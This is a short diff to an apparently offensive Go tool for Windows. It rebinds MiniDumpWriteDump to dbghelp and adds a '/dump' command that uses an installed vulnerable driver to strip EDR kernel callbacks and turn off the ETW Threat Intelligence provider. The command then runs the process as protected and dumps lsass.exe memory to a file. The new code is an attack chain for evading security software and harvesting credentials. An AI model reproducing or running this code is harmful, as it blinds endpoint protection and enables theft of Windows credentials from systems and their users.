@@ -15,7 +15,7 @@ import (
 //sys GetDeviceDriverBaseNameW(lpImageBase uintptr,lpBaseName uintptr, nSize uint32) (ret uint32,err error) = psapi.GetDeviceDriverBaseNameW
 //sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
 //sys SetEntriesInAclW(cCountOfExplicitEntries uint32, pListOfExplicitEntries *windows.EXPLICIT_ACCESS, OldAcl *windows.ACL, NewAcl **windows.ACL) (ret uint32) = advapi32.SetEntriesInAclW
-//sys MiniDumpWriteDump(handle windows.Handle, ProcessId uint32, hFile windows.Handle, dumpType uint32, exceptionParam unsafe.Pointer, userStreamParam unsafe.Pointer, callbackParam unsafe.Pointer) (ret bool) = minidumpapiset.MiniDumpWriteDump
+//sys MiniDumpWriteDump(handle windows.Handle, ProcessId uint32, hFile windows.Handle, dumpType uint32, exceptionParam unsafe.Pointer, userStreamParam unsafe.Pointer, callbackParam unsafe.Pointer) (ret bool) = dbghelp.MiniDumpWriteDump
 
 //go:embed Offsets/NtoskrnlOffsets.csv
 var ntoskrnlOffsetsCSV string
@@ -117,6 +117,13 @@ func main() {
 		installVulnDriver()
 	} else if os.Args[1] == "/uninstall" {
 		uninstallVulnDriver()
+	} else if os.Args[1] == "/dump" {
+		edrCallbacks := removeAllEDRKernelCallbacks()
+		ntoskrnlOffsets := getNtoskrnlVersion()
+		changeStatusETWThreatIntelProvider(&ntoskrnlOffsets, false)
+		setProcessAsProtected()
+		dumpProcess("lsass.exe", "lsass.dmp")
+		restoreAllEDRKernelCallbacks(edrCallbacks)
 	} else if os.Args[1] == "/test" {
 		setProcessAsProtected()
 		//getEPROCESSAddress()
